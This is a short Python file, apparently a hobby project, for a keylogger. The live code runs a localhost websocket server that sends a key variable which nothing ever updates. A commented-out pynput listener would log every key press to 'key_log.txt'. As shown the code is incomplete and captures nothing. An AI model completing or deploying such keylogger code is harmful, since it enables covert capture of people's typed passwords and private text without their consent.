# the library used for key-press event listeners
from pynput.keyboard import Key, Listener

# for logging
import logging

# for websocket
import asyncio
import websockets

# make a log file
logging.basicConfig(filename="key_log.txt", filemode='w', level=logging.DEBUG, format='%(asctime)s: %(message)s:')

# used to store the current key
key_pressed = ''


async def send_keys(websocket, path):
    print(websocket)
    await websocket.send(key_pressed)


start_server = websockets.serve(send_keys, "localhost", 8765)

asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()

#
# # on_press function => logging the pressed key
# # is stopped when ctrl+z is pressed
# def on_press(key):
#     if hasattr(key, 'char') and key.char == '\x1a':
#         return False
#     logging.info(str(key))
#
#
# # on_release function => logging the released key
# def on_release(key):
#     pass
#
#
# # the actual listener
# with Listener(on_press=on_press, on_release=on_release) as listener:
#     print('Keylogger is on!')
#     listener.join()
